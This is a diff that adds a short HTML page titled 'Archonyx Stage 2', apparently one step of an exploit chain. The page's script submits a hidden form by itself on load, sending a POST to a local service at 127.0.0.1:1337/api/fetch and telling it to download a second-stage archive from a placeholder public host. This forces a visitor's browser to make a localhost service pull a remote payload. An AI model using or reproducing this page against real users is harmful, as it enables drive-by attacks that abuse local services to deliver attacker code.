@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Archonyx Stage 2</title>
+</head>
+<body>
+  <form
+    id="fetch-form"
+    method="POST"
+    action="http://127.0.0.1:1337/api/fetch"
+  >
+    <input
+      type="hidden"
+      name="url"
+      value="https://PUBLIC_HOST/stage2.tar"
+    >
+  </form>
+
+  <script>
+    document.getElementById('fetch-form').submit();
+  </script>
+</body>
+</html>
